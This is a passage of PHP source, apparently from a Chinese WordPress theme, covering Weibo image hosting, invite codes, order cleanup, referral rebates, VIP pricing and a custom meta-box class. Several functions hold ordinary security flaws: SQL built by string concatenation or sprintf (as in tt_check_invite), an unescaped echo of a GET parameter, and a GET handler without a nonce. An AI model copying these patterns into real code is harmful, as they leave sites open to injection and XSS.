add_filter('post_thumbnail_html', 'wp_image_to_weibo_content_img_replace');
if (tt_get_option('tt_enable_k_weibo_image') && tt_get_option('tt_k_weibo_image_type') == 'normal') {
    add_filter('the_content', 'wp_image_to_weibo_content_img_replace', 1);
} else if (tt_get_option('tt_enable_k_weibo_image') && tt_get_option('tt_k_weibo_image_type') == 'modify') {
    add_filter('wp_insert_post_data', 'process_post_when_save', 99, 2);
}
function wp_image_to_weibo_content_img_replace($content, $show_query_num = true){
  global $wb_uploader, $post;
  if((tt_get_option('tt_k_weibo_image_type') == 'modify' && $_POST['tt_post_enable_weibo_image']=='enable') || (tt_get_option('tt_k_weibo_image_type') == 'normal' && get_post_meta($post->ID,'tt_post_enable_weibo_image',true)=='enable')){
    if ($wb_uploader == null) {
        $content .= PHP_EOL . '<!--请在主题选项中设置微博账号及密码-->' . PHP_EOL;
        return $content;
    }
    $before = get_num_queries();
    $pattern = '/(https?:)?\/\/([^\s]*).\.(jpg|jpeg|png|gif|bmp)/i';
    $content = preg_replace_callback($pattern, 'wp_image_to_weibo_match_callback', $content);
    if ($show_query_num) {
        $content .= PHP_EOL . "<!-- [微博图床查询: " . (get_num_queries() - $before) . '] -->' . PHP_EOL;
    }
  }
    return $content;
}

function wp_image_to_weibo_match_callback($matches){
    // echo $matches[0] . PHP_EOL;
    $url = $matches[0];
    if (!$matches[1]) {
        $url = $_SERVER["REQUEST_SCHEME"] . ':' . $url;
    }
    // return $matches[0];
    $vm = WeiboImageVM::getInstance($url); 
    $data = $vm->modelData;
    return $data->url;
}

function wp_image_to_weibo_img_replace($url){
    global $wb_uploader, $wpdb, $post, $processed;
    if ($processed[$url]) { //hit cache
        return $processed[$url];
    }
    if (stripos($url, ".sinaimg.cn/") > 0) {
        return $url;
    }
    $prefix = $wpdb->prefix;
    $table_name = $prefix.'tt_weibo_image';
    //检查数据库是否有
    $data = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE src = %s", $url));
    $link = $pid = $url;
    if (!$data || count($data) == 0) { //如果没有则上传
        $file = $url;
        $home_path = home_url('/');
        $multipart = false;// whether is local file or not
        if (strpos($url, $home_path) != false) {
            $multipart = true;
            $file = ABSPATH . substr($file, strlen($home_path));
        }
        if (strpos($url, 'Timthumb.php') != false) {
            $multipart = false;
            $file = $url;
        }
        try {
            $pid = $wb_uploader->upload($file, $multipart);
            $in = array(
                'post_id' => $post->ID,
                'src' => $url,
                'pid' => $pid,
            );
            $wpdb->insert($table_name, $in);
            $data2 = $wpdb->get_results($wpdb->prepare("SELECT pid FROM $table_name WHERE src = %s and post_id = %s", $url ,$post->ID));
            $link = $wb_uploader->getImageUrl($data2[0]->pid);
        } catch (\Kuacg\WeiBoException $e) {
            echo "<!--ERROR[{$e->getMessage()}][$url]-->" . PHP_EOL;
        }
    } elseif(post_id_arr_to($data, $post->ID)){
      $pid = $data[0]->pid;
      $in = array(
                'post_id' => $post->ID,
                'src' => $url,
                'pid' => $pid,
            );
      $wpdb->insert($table_name, $in);
      $link = $wb_uploader->getImageUrl($pid);
    } else {
        $pid = $data[0]->pid;
        $link = $wb_uploader->getImageUrl($pid);
    }
    $processed[$url] = $link;
    return $link;
}
function post_id_arr_to($arr, $post_id){
 foreach($arr as $post){
   if($post->post_id == $post_id){
     return false;
   }
 }
  return true;
}
function process_post_when_save($data, $postarr){
    $data['post_content'] = wp_image_to_weibo_content_img_replace($data['post_content'], false);
    $data['post_content_filtered'] = wp_image_to_weibo_content_img_replace($data['post_content_filtered'], false);
    return $data;
}
add_filter('manage_posts_columns', 'customer_weibo_img_columns');
function customer_weibo_img_columns($columns) {
        $columns['weibo_img'] = '微博图床';
        return $columns;
}
add_action('manage_posts_custom_column', 'customer_weibo_img_columns_value', 10, 2);
function customer_weibo_img_columns_value($column, $post_id) {
        if ($column == 'weibo_img') {
          $enable_weibo_image = get_post_meta($post_id,'tt_post_enable_weibo_image',true) == 'enable' ? '是' : '<a href="'.get_permalink($post_id).'?enable_weibo_img='.$post_id.'" target="_blank">打开</a>';
             echo $enable_weibo_image;
        }
        return;
}
if (isset($_GET['enable_weibo_img']) && current_user_can('edit_users')) {
  update_post_meta($_GET['enable_weibo_img'], 'tt_post_enable_weibo_image', 'enable');

}
function getHttpStatus($url) {
        $curl = curl_init();
        curl_setopt($curl,CURLOPT_URL,$url);
        curl_setopt($curl,CURLOPT_NOBODY,1);
        curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($curl,CURLOPT_TIMEOUT,5);
        curl_exec($curl);
        $re = curl_getinfo($curl,CURLINFO_HTTP_CODE);
        curl_close($curl);
        return  $re;
    }
function write_log($text){
    $file = THEME_DIR.'/check_weibo_image.log';
    file_put_contents($file, $text.PHP_EOL, FILE_APPEND);
}
function array2object($array) {
    if (is_array($array)) {
        $obj = new StdClass();
        foreach($array as $key => $val) {
            $obj->$key = $val;
        }
    } else {
        $obj = $array;
    }
    return $obj;
}
function tt_daily_check_weibo_image($post_id = ''){
    if(!tt_get_option('tt_enable_k_weibo_image') || !tt_get_option('tt_enable_k_auto_check_weibo_image')){
      return;
    }
    global $wpdb;
    if(get_option('weibo_image_runlock') == 'true'){
      echo '正在运行中，请勿重复运行，可访问主题根目录查询日志';
    }else{
    update_option('weibo_image_runlock', 'true');
    $prefix = $wpdb->prefix;
    $table_name = $prefix.'tt_weibo_image';
    if(empty($post_id)){
    $rs = $wpdb->get_results("SELECT post_id, src, pid FROM $table_name");
    }else{
    $rs = $wpdb->get_results("SELECT post_id, src, pid FROM $table_name where post_id = $post_id");
    }
    write_log('循环检查开始：'.date("Y-m-d H:i:s", time()));
    return tt_daily_check_weibo_image_data($rs);
  }
}
add_action('tt_setup_common_daily_event', 'tt_daily_check_weibo_image');
function tt_daily_check_weibo_image_data($array){
    global $wb_uploader, $wpdb;
    $prefix = $wpdb->prefix;
    $table_name = $prefix.'tt_weibo_image';
    $success = array();
    foreach ($array as $row) {
      $link = $wb_uploader->getImageUrl($row->pid);
      if(getHttpStatus($link) == '301' || getHttpStatus($link) == '404'){
         $wpdb->query( "DELETE FROM $table_name WHERE pid = '$row->pid'" );
         $url = $row->src;
         $post_id = $row->post_id;
         $file = $url;
         $home_path = home_url('/');
         $multipart = false;// whether is local file or not
         if (strpos($url, $home_path) != false) {
            $multipart = true;
            $file = ABSPATH . substr($file, strlen($home_path));
        }
        if (strpos($url, 'Timthumb.php') != false) {
            $multipart = false;
            $file = $url;
        }
        try {
            $pid = $wb_uploader->upload($file, $multipart);
            //$pid = uploadByUrl($file);
            $in = array(
                'post_id' => $post_id,
                'src' => $url,
                'pid' => $pid,
            );
            $wpdb->insert($table_name, $in);
            write_log('修复完成：'.date("Y-m-d H:i:s", time()).'|'.$url);
            $data = $wpdb->get_results($wpdb->prepare("SELECT pid FROM $table_name WHERE src = %s and post_id = %s", $url ,$post_id));
            $ins = array(
                'post_id' => $post_id,
                'src' => $url,
                'pid' => $data[0]->pid,
            );
            $ins = array2object($ins);
            if(tt_get_option('tt_k_weibo_image_type') == 'modify'){
            $post = get_post($post_id);
            $link = '/(https?:)?\/\/(ws|wx)(\d).sinaimg.cn\/(large|mw690|mw1024|mw2048|bmiddle)\/'.$row->pid.'.(jpg|jpeg|png|gif|bmp)/i';
            $post->post_content = preg_replace($link, $wb_uploader->getImageUrl($data[0]->pid), $post->post_content);
            $ret = wp_update_post($post);
            if ($ret == 0) {
                 wp_update_post($post);
              }
            }
            array_push($success, $ins);
        } catch (\Kuacg\WeiBoException $e) {
            echo "<!--ERROR[{$e->getMessage()}][$url]-->" . PHP_EOL;
        }
      }
    }
    write_log('本次检查结束：'.date("Y-m-d H:i:s", time()).'|共修复'.count($success).'张图片');
    if(!empty($success)){
    sleep(10);
    return tt_daily_check_weibo_image_data($success);
    }else{
       write_log('循环检查结束：'.date("Y-m-d H:i:s", time()));
       tt_cache_flush_daily();
       echo '修复程序运行完毕，请清理缓存';
       return update_option('weibo_image_runlock', 'false');
    }
}

function tt_delete_post_and_weibo_image($post_ID) {
    global $wpdb;
    $prefix = $wpdb->prefix;
    $table_name = $prefix.'tt_weibo_image';
    $wpdb->query( "DELETE FROM $table_name WHERE post_id = $post_ID" );
}
add_action('before_delete_post', 'tt_delete_post_and_weibo_image');

function weibo_attachment_replace($url){
    global $wb_uploader, $wpdb;
    $prefix = $wpdb->prefix;
    $table_name = $prefix.'tt_weibo_image';
    //检查数据库是否有
    $data = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE src = %s", $url));
    if (!$data || count($data) == 0) { //如果没有则上传
    } else {
        $pid = $data[0]->pid;
        $url = $wb_uploader->getImageUrl($pid);
    }
	
	return $url;
}
if (tt_get_option('tt_enable_k_weibo_image', false) && tt_get_option('tt_enable_media_weibo_image', false) && is_admin() && ($_SERVER['PHP_SELF'] == '/wp-admin/upload.php' || strpos($_SERVER['HTTP_REFERER'],'/wp-admin/') !==false || strpos($_SERVER['HTTP_REFERER'],'/me/') !==false)) {
add_filter('wp_get_attachment_url', 'weibo_attachment_replace');
}
function weibo_attachment_replace_rest($url){
    global $wb_uploader, $wpdb;
    $pattern = '/(https?:)?\/\/([^\s]*).sinaimg.cn\/(large|mw690|mw1024|mw2048|bmiddle)\/([^\s]*)\.(jpg|jpeg|png|gif|bmp)/i';
    preg_match($pattern,$url,$match);
    $prefix = $wpdb->prefix;
    $table_name = $prefix.'tt_weibo_image';
    //检查数据库是否有
    $data = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE pid = %s", $match[4]));
    if (!$data || count($data) == 0) { //如果没有则上传
    } else {
        $url = preg_replace($pattern, $data[0]->src, $url);
    }
	
	return $url;
}
add_filter( 'image_send_to_editor', 'weibo_attachment_replace_rest');
function tt_install_invites_table(){
    global $wpdb;
    include_once ABSPATH.'/wp-admin/includes/upgrade.php';
    $table_charset = '';
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_invites';
    if ($wpdb->has_cap('collation')) {
        if (!empty($wpdb->charset)) {
            $table_charset = "DEFAULT CHARACTER SET $wpdb->charset";
        }
        if (!empty($wpdb->collate)) {
            $table_charset .= " COLLATE $wpdb->collate";
        }
    }

    $create_invites_sql = "CREATE TABLE $invites_table (id int(11) NOT NULL auto_increment,invite_code varchar(20) NOT NULL,invite_type varchar(20) NOT NULL default 'once',invite_status int(11) NOT NULL default 1,begin_date datetime NOT NULL default '0000-00-00 00:00:00',expire_date datetime NOT NULL default '0000-00-00 00:00:00',PRIMARY KEY (id),INDEX invitecode_index(invite_code)) ENGINE = MyISAM $table_charset;";
    maybe_create_table($invites_table, $create_invites_sql);
}
add_action('admin_init', 'tt_install_invites_table');

function tt_add_invite($code, $type = 'once', $begin_date, $expire_date)
{
    
    //检查code重复
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_invites';
    $exist = $wpdb->get_row(sprintf("SELECT * FROM $invites_table WHERE `invite_code`='%s'", $code));
    if ($exist) {
        return new WP_Error('邀请码已存在', __('这个邀请码已存在', 'tt'), array('status' => 403));
    }

    $begin_date = $begin_date ?: current_time('mysql');
    $expire_date = $expire_date ?: current_time('mysql'); //TODO 默认有效期天数
    //添加记录
    $insert = $wpdb->insert(
        $invites_table,
        array(
            'invite_code' => $code,
            'invite_type' => $type,
            'begin_date' => $begin_date,
            'expire_date' => $expire_date,
            //'unavailable_products' => $unavailable_products,
            //'unavailable_product_cats' => $unavailable_product_cats
        ),
        array(
            '%s',
            '%s',
            '%s',
            '%s',
            //'%s',
            //'%s'
        )
    );
    if ($insert) {
        return $wpdb->insert_id;
    }

    return false;
}

function tt_delete_invite($id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_invites';
    $delete = $wpdb->delete(
        $invites_table,
        array('id' => $id),
        array('%d')
    );

    return (bool) $delete;
}

function tt_auto_delete_invite_order()
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_orders';
    $delete = $wpdb->delete(
        $invites_table,
        array('product_id' => -9,'order_status' => 9),
        array('%d','%d')
    );

    return (bool) $delete;
}
add_action('tt_setup_common_daily_event', 'tt_auto_delete_invite_order');

function tt_auto_delete_donate_order()
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $donate_table = $prefix.'tt_orders';
    $delete = $wpdb->delete(
        $donate_table,
        array('product_id' => -8,'order_status' => 9),
        array('%d','%d')
    );

    return (bool) $delete;
}
add_action('tt_setup_common_daily_event', 'tt_auto_delete_donate_order');

function tt_auto_delete_vip_down_count()
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $donate_table = $prefix.'usermeta';
    $delete = $wpdb->delete(
        $donate_table,
        array('meta_key' => 'tt_vip_down_count'),
        array('%s')
    );

    return (bool) $delete;
}
add_action('tt_setup_common_daily_event', 'tt_auto_delete_vip_down_count');

function tt_update_invite($id, $data, $format)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_invites';
    $update = $wpdb->update(
        $invites_table,
        $data,
        array('id' => $id),
        $format,
        array('%d')
    );

    return !($update === false);
}

function tt_get_invite($id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_invites';
    $invite = $wpdb->get_row(sprintf("SELECT * FROM $invites_table WHERE `id`=%d", $id));

    return $invite;
}

function tt_get_invites($limit = 20, $offset = 0, $in_effect = false)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_invites';
    if ($in_effect) {
        $now = new DateTime();
        $sql = sprintf("SELECT * FROM $invites_table WHERE `invite_status`=1 AND `begin_date`<'%s' AND `expire_date`>'%s' ORDER BY id DESC LIMIT %d OFFSET %d", $now, $now, $limit, $offset);
    } else {
        $sql = sprintf("SELECT * FROM $invites_table ORDER BY id DESC LIMIT %d OFFSET %d", $limit, $offset);
    }
    $results = $wpdb->get_results($sql);

    return $results;
}

function tt_count_invites($in_effect = false)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $invites_table = $prefix.'tt_invites';
    if ($in_effect) {
        $now = new DateTime();
        $sql = sprintf("SELECT COUNT(*) FROM $invites_table WHERE `invite_status`=1 AND `begin_date`<'%s' AND `expire_date`>'%s'", $now, $now);
    } else {
        $sql = "SELECT COUNT(*) FROM $invites_table";
    }
    $count = $wpdb->get_var($sql);

    return $count;
}

function tt_check_invite($code)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $coupons_table = $prefix.'tt_invites';
    $coupon = $wpdb->get_row(sprintf("SELECT * FROM $coupons_table WHERE `invite_code`='%s'", $code));
    if (!$coupon) {
        return new WP_Error('邀请码不存在', __('这个邀请码不存在', 'tt'), array('status' => 404));
    }
    if (!($coupon->invite_status)) {
        return new WP_Error('邀请码已使用', __('这个邀请码已经使用过了', 'tt'), array('status' => 404));
    }
    $timestamp = time();
    if ($timestamp < strtotime($coupon->begin_date)) {
        return new WP_Error('邀请码未生效', __('邀请码还未生效', 'tt'), array('status' => 404));
    }
    if ($timestamp > strtotime($coupon->expire_date)) {
        return new WP_Error('邀请码失效', __('这个邀请码已经失效', 'tt'), array('status' => 404));
    }
    if ($coupon->invite_type == 'once') {
        $mark_used = tt_update_invite($coupon->id, array('invite_status' => 0), array('%d'));
    }
    return $coupon;
}

function tt_gen_invites($quantity, $type, $begin_date, $expire_date){
    $raw_cards = array();
    $cards = array();
    $place_holders = array();
    for ($i = 0; $i < $quantity; ++$i) {
        $card = Utils::generateRandomStr(8);
        array_push($raw_cards, $card);
        array_push($cards, $card, $type, $begin_date, $expire_date);
        array_push($place_holders, "('%s', '%s', '%s', '%s')");
    }

    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_invites';

    $query = "INSERT INTO $cards_table (invite_code, invite_type, begin_date, expire_date) VALUES ";
    $query .= implode(', ', $place_holders);
    $result = $wpdb->query($wpdb->prepare("$query ", $cards));

    if (!$result) {
        return false;
    }

    return true;
}

function tt_send_order_invite($order_id){
    $invite_option = tt_get_option('tt_enable_k_invite', false);
    if(!$invite_option){
        return;
    }
    $order = tt_get_order($order_id);
    if(!$order || $order->order_status != OrderStatus::TRADE_SUCCESS){
        return;
    }

    if($order->product_id == '-9') {
       $invite_active_time = tt_get_option('tt_k_invite_active_time');
       $card = 'Pay'.Utils::generateRandomStr(5);
       $begin_date = date("Y-m-d H:i:s",time());
       $expire_date = date("Y-m-d H:i:s",strtotime('+'.$invite_active_time.' day'));
       tt_add_invite($card, 'once', $begin_date, $expire_date);
       tt_update_order($order_id, array(
             'trade_no' => $card
         ), array('%s'));
      }
    }
add_action('tt_order_status_change', 'tt_send_order_invite');

function tt_send_order_donate($order_id){
    $donate_option = tt_get_option('tt_enable_k_donate', false);
    if(!$donate_option){
        return;
    }
    $order = tt_get_order($order_id);
    if(!$order || $order->order_status != OrderStatus::TRADE_SUCCESS){
        return;
    }

    if($order->product_id == '-8') {
       tt_update_order($order_id, array(
             'trade_no' => 'Pay'.tt_encrypt($order_id, tt_get_option('tt_private_token'))
         ), array('%s'));
    }
}
add_action('tt_order_status_change', 'tt_send_order_donate');

function tt_get_custom_post_tags($post_id, $count = '10') {
    $tags = wp_get_post_tags($post_id);
    if (!$tags) {
        return;
    }
    $html = '';
    $i = 0;
    foreach($tags as $tag) {
        $i++;
        $tag_link = get_tag_link($tag->term_id);
        if ($i <= $count) {
            $html .= '<a href="'.$tag_link.'" rel="tag">'.$tag->name.'</a>';
        } else {
            $html .= '<a href="'.$tag_link.'" rel="tag" style="display: none;">'.$tag->name.'</a>';
        }
    }
    return $html;
}

function tt_get_privacy_mail($mail) {
  $email_display_name = explode('@', $mail);
  $mail = strpos($mail,'@') != false && !current_user_can('edit_users') ? substr_replace($email_display_name[0],'**',-2,2).'@'.$email_display_name[1]:$mail;
  return $mail;
}

function my_upload_media( $wp_query_obj ) {
	global $current_user, $pagenow;
	if( !is_a( $current_user, 'WP_User') )
		return;
	if( 'admin-ajax.php' != $pagenow || $_REQUEST['action'] != 'query-attachments' )
		return;
	if( !current_user_can( 'manage_options' ) && !current_user_can('manage_media_library') )
		$wp_query_obj->set('author', $current_user->ID );
	return;
}
add_action('pre_get_posts','my_upload_media');

function my_media_library( $wp_query ) {
    if ( strpos( $_SERVER[ 'REQUEST_URI' ], '/wp-admin/upload.php' ) !== false ) {
        if ( !current_user_can( 'manage_options' ) && !current_user_can( 'manage_media_library' ) ) {
            global $current_user;
            $wp_query->set( 'author', $current_user->id );
        }
    }
}
add_filter('parse_query', 'my_media_library' );

function tt_send_order_rec_rebate($order_id){
    $open_tt_rec_rebate = tt_get_option('tt_rec_rebate');
    if(!$open_tt_rec_rebate){
        return;
    }
    $order = tt_get_order($order_id);
    $user_id = (int) get_user_meta($order->user_id, 'tt_ref', true);
    if(!$order || $order->order_status != OrderStatus::TRADE_SUCCESS || empty($user_id)){
        return;
    }
    $tt_rec_rebate_ratio = tt_get_option('tt_rec_rebate_ratio');
    $amount = $tt_rec_rebate_ratio * $order->order_total_price;
    $before_cash = (int) get_user_meta($user_id, 'tt_cash', true);
    $before_credit = (int) get_user_meta($user_id, 'tt_credits', true);
    if($order->order_currency == 'cash') {
        $msg = sprintf(__('获得推广提成（来自%s的消费）奖励 %s 元 , 当前余额 %s 元', 'tt'), get_user_by('ID',$order->user_id)->display_name, sprintf('%0.2f', max(0, (int) $amount) / 100), sprintf('%0.2f', (max(0, (int) $amount) + $before_cash) / 100));
        return tt_update_user_cash($user_id, $amount, $msg);
       }else{
        $amount = intval($amount / 100);
        $msg = sprintf(__('获得推广提成（来自%s的消费）奖励 %s 积分 , 当前余额 %s 积分', 'tt'), get_user_by('ID',$order->user_id)->display_name, max(0, (int) $amount), max(0, (int) $amount) + $before_credit);
        return tt_update_user_credit($user_id, $amount, $msg);
    }
    }
add_action('tt_order_status_change', 'tt_send_order_rec_rebate');

function tt_get_no_pay_order_count($user_id){
    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_orders';
    $sql = sprintf("SELECT COUNT(*) FROM $cards_table WHERE `user_id`=$user_id and `order_status`=1 and `deleted`=0");
    $count = $wpdb->get_var($sql);

    return $count;
}
function tt_get_specified_user_post_price($price, $currency, $user_id = 0) {
    $price = $currency == 'cash' ? sprintf('%0.2f', $price) : (int)$price;

    $discount_summary = array(100, intval(tt_get_option('tt_monthly_vip_discount', 100)), intval(tt_get_option('tt_annual_vip_discount', 90)), intval(tt_get_option('tt_permanent_vip_discount', 80)));

    $user_id = $user_id ? : get_current_user_id();
    if(!$user_id) {
        return $currency == 'cash' ? sprintf('%0.2f', $price * absint($discount_summary[0]) / 100) : intval($price * absint($discount_summary[0]) / 100);
    }
    $member = new Member($user_id);
    switch ($member->vip_type){
        case Member::MONTHLY_VIP:
            $discount = $discount_summary[1];
            break;
        case Member::ANNUAL_VIP:
            $discount = $discount_summary[2];
            break;
        case Member::PERMANENT_VIP:
            $discount = $discount_summary[3];
            break;
        default:
            $discount = $discount_summary[0];
            break;
    }
    $discount = min($discount_summary[0], $discount); // 会员的价格不能高于普通打折价

    // 最低价格
   
    return $currency == 'cash' ? sprintf('%0.2f', $price * absint($discount) / 100) : intval($price * absint($discount) / 100);
}
$wboptions = array();        
$wbboxinfo = array('title' => '文章视频', 'id'=>'ashubox', 'page'=>array('page','post'), 'context'=>'normal', 'priority'=>'low', 'callback'=>'');      
           
$wboptions[] = array(      
            "name" => "文章视频地址(也可以直接填写视频url地址)",      
            "desc" => "",      
            "id" => "ashu_video",      
            "std" => "",      
            "button_label"=>'上传视频',      
            "type" => "media"     
            );      
$wbox_shop_metabox = array('title' => '封面视频', 'id'=>'wboxbox', 'page'=>array('product'), 'context'=>'normal', 'priority'=>'low', 'callback'=>'');

$wbox_shop_mitem = array( array(
  "name" => "商品视频地址(也可以直接填写视频url地址)",      
            "desc" => "",      
            "id" => "ashu_video",      
            "std" => "",      
            "button_label"=>'上传视频',      
            "type" => "media" 
  
  ));
              
$new_box = new ashu_meta_box($wboptions, $wbboxinfo);
$shop_box = new ashu_meta_box($wbox_shop_mitem, $wbox_shop_metabox);
class ashu_meta_box{   
    var $options;
    var $boxinfo;
    //构造函数  
    function ashu_meta_box($options,$boxinfo){   
        $this->options = $options;   
        $this->boxinfo = $boxinfo;   
           
        add_action('admin_menu', array(&$this, 'init_boxes'));   
        add_action('save_post', array(&$this, 'save_postdata'));   
    }   
    
    //初始化   
    function init_boxes(){   
        $this->create_meta_box();   
    }   
       
    /*************************/  
    function add_hijack_var()   
    {   
        echo "<meta name='hijack_target' content='".$_GET['hijack_target']."' />\n";   
    }   
       
    //创建自定义面板   
    function create_meta_box(){   
        if ( function_exists('add_meta_box') && is_array($this->boxinfo['page']) )    
        {   
            foreach ($this->boxinfo['page'] as $area)   
            {      
                if ($this->boxinfo['callback'] == '') $this->boxinfo['callback'] = 'new_meta_boxes';   
                   
                add_meta_box(      
                    $this->boxinfo['id'],    
                    $this->boxinfo['title'],   
                    array(&$this, $this->boxinfo['callback']),   
                    $area, $this->boxinfo['context'],    
                    $this->boxinfo['priority']   
                );     
            }   
        }     
    }   
       
    //创建自定义面板的显示函数   
    function new_meta_boxes(){   
        global $post;   
        //根据类型调用显示函数   
        foreach ($this->options as $option)   
        {                  
            if (method_exists($this, $option['type']))   
            {   
                $meta_box_value = get_post_meta($post->ID, $option['id'], true);    
                if($meta_box_value != "") $option['std'] = $meta_box_value;     
                   
                echo '<div class="alt kriesi_meta_box_alt meta_box_'.$option['type'].' meta_box_'.$this->boxinfo['context'].'">';   
                $this->{$option['type']}($option);
                echo '</div>';   
            }   
        }   
           
        //隐藏域   
        echo'<input type="hidden" name="'.$this->boxinfo['id'].'_noncename" id="'.$this->boxinfo['id'].'_noncename" value="'.wp_create_nonce( 'ashumetabox' ).'" />';     
    }   
       
    //保存字段数据   
    function save_postdata() {   
        if( isset( $_POST['post_type'] ) && in_array($_POST['post_type'],$this->boxinfo['page'] ) && (isset($_POST['save']) || isset($_POST['publish']) ) ){   
        $post_id = $_POST['post_ID'];   
           
        foreach ($this->options as $option) {   
            if (!wp_verify_nonce($_POST[$this->boxinfo['id'].'_noncename'], 'ashumetabox')) {      
                return $post_id ;   
            }   
            //判断权限   
            if ( 'page' == $_POST['post_type'] ) {   
                if ( !current_user_can( 'edit_page', $post_id  ))   
                return $post_id ;   
            } else {   
                if ( !current_user_can( 'edit_post', $post_id  ))   
                return $post_id ;   
            }   
            //将预定义字符转换为html实体   
            if( $option['type'] == 'tinymce' ){   
                    $data =  stripslashes($_POST[$option['id']]);   
            }elseif( $option['type'] == 'checkbox' ){   
                    $data =  $_POST[$option['id']];   
            }else{   
                $data = htmlspecialchars($_POST[$option['id']], ENT_QUOTES,"UTF-8");   
            }   
               
            if(get_post_meta($post_id , $option['id']) == "")   
            add_post_meta($post_id , $option['id'], $data, true);   
               
            elseif($data != get_post_meta($post_id , $option['id'], true))   
            update_post_meta($post_id , $option['id'], $data);   
               
            elseif($data == "")   
            delete_post_meta($post_id , $option['id'], get_post_meta($post_id , $option['id'], true));   
               
        }   
        }   
    }   
    //显示标题   
    function title($values){   
        echo '<h2>'.$values['name'].'</h2>';   
    }   
    //文本框   
    function text($values){    
        if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];   
           
        echo '<h2>'.$values['name'].'</h2>';   
        echo '<p><input type="text" size="'.$values['size'].'" value="'.$values['std'].'" id="'.$values['id'].'" name="'.$values['id'].'"/>';   
        echo $values['desc'].'<br/></p>';   
        echo '<br/>';   
    }   
    //文本域   
    function textarea($values){   
        if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];   
           
        echo '<h2>'.$values['name'].'</h2>';   
        echo '<p><textarea class="kriesi_textarea" cols="60" rows="5" id="'.$values['id'].'" name="'.$values['id'].'">'.$values['std'].'</textarea>';   
        echo $values['desc'].'<br/></p>';   
        echo '<br/>';   
    }   
    //媒体上传   
    function media($values){   
        if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];   
           
        //图片上传按钮   
        global $post_ID, $temp_ID;   
        $uploading_iframe_ID = (int) (0 == $post_ID ? $temp_ID : $post_ID);   
        $media_upload_iframe_src = "media-upload.php?post_id=$uploading_iframe_ID";   
        $image_upload_iframe_src = apply_filters('image_upload_iframe_src', "$media_upload_iframe_src&amp;type=image");   
           
        $button = '<a href="'.$image_upload_iframe_src.'&amp;hijack_target='.$values['id'].'&amp;TB_iframe=true" id="'.$values['id'].'" class="k_hijack button thickbox" onclick="return false;" >上传</a>';   
           
        //判断图片格式,图片预览   
        $image = '';   
        if($values['std'] != '') {   
            $fileextension = substr($values['std'], strrpos($values['std'], '.') + 1);   
            $extensions = array('png','gif','jpeg','jpg','pdf','tif');   
               
            if(in_array($fileextension, $extensions))   
            {   
                $image = '<img src="'.$values['std'].'" />';   
            }   
        }   
           
        echo '<div id="'.$values['id'].'_div" class="kriesi_preview_pic">'.$image .'</div>';   
        echo '<p>'.$values['name'].'</p><p>';   
        if($values['desc'] != "") echo '<p>'.$values['desc'].'<br/>';   
        echo '<input class="kriesi_preview_pic_input" type="text" size="'.@$values['size'].'" value="'.$values['std'].'" name="'.$values['id'].'"/>'.$button;   
        echo '</p>';   
        echo '<br/>';   
    }   
    //单选框   
    function radio( $values ){   
        if(isset($this->database_options[$values['id']]))   
            $values['std'] = $this->database_options[$values['id']];   
        echo '<h2>'.$values['name'].'</h2>';   
        foreach( $values['buttons'] as $key=>$value ) {   
            $checked ="";   
            if($values['std'] == $key) {   
                $checked = 'checked = "checked"';   
            }   
            echo '<input '.$checked.' type="radio" class="kcheck" value="'.$key.'" name="'.$values['id'].'"/>'.$value;   
        }   
    }   
    //复选框   
    function checkbox($values){   
        echo '<h2>'.$values['name'].'</h2>';   
        foreach( $values['buttons'] as $key=>$value ) {   
            $checked ="";   
            if( is_array($values['std']) && in_array($key,$values['std'])) {   
                $checked = 'checked = "checked"';   
            }   
            echo '<input '.$checked.' type="checkbox" class="kcheck" value="'.$key.'" name="'.$values['id'].'[]"/>'.$value;   
        }   
        echo '<label for="'.$values['id'].'">'.$values['desc'].'</label><br/></p>';   
    }   
    //下拉框   
    function dropdown($values){   
        echo '<h2>'.$values['name'].'</h2>';   
            //选择内容可以使页面、分类、菜单、侧边栏和自定义内容   
            if($values['subtype'] == 'page'){   
                $select = 'Select page';   
                $entries = get_pages('title_li=&orderby=name');   
            }else if($values['subtype'] == 'cat'){   
                $select = 'Select category';   
                $entries = get_categories('title_li=&orderby=name&hide_empty=0');   
            }else if($values['subtype'] == 'menu'){   
                $select = 'Select Menu in page left';   
                $entries = get_terms( 'nav_menu', array( 'hide_empty' => false ) );   
            }else if($values['subtype'] == 'sidebar'){   
                global $wp_registered_sidebars;   
                $select = 'Select a special sidebar';   
                $entries = $wp_registered_sidebars;   
            }else{     
                $select = 'Select...';   
                $entries = $values['subtype'];   
            }   
           
            echo '<p><select class="postform" id="'. $values['id'] .'" name="'. $values['id'] .'"> ';   
            echo '<option value="">'.$select .'</option>  ';   
               
            foreach ($entries as $key => $entry){   
                if($values['subtype'] == 'page'){   
                    $id = $entry->ID;   
                    $title = $entry->post_title;   
                }else if($values['subtype'] == 'cat'){   
                    $id = $entry->term_id;   
                    $title = $entry->name;   
                }else if($values['subtype'] == 'menu'){   
                    $id = $entry->term_id;   
                    $title = $entry->name;   
                }else if($values['subtype'] == 'sidebar'){   
                    $id = $entry['id'];   
                    $title = $entry['name'];   
                }else{   
                    $id = $entry;   
                    $title = $key;                 
                }   
  
                if ($values['std'] == $id ){   
                    $selected = "selected='selected'";     
                }else{   
                    $selected = "";        
                }   
                   
                echo"<option $selected value='". $id."'>". $title."</option>";   
            }   
           
